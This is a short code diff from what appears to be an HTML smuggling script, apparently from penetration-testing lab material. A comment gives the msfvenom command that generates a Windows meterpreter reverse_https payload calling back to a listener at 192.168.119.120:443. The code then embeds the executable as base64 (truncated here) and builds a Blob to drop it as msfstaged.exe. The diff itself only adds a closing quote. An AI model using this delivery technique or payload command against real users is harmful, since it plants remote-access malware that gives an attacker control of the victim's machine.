@@ -11,7 +11,7 @@
 
             // msfvenom -p windows/x64/meterpreter/reverse_https LHOST=192.168.119.120 LPORT=443 -f exe -o met.exe
             // base64 met.exe
-      		var file ='TVqQAAMAAAAEAAAA//8AALgAAAAAAAAAQAAAAA...
+      		var file ='TVqQAAMAAAAEAAAA//8AALgAAAAAAAAAQAAAAA...'
       		var data = base64ToArrayBuffer(file);
       		var blob = new Blob([data], {type: 'octet/stream'});
       		var fileName = 'msfstaged.exe';
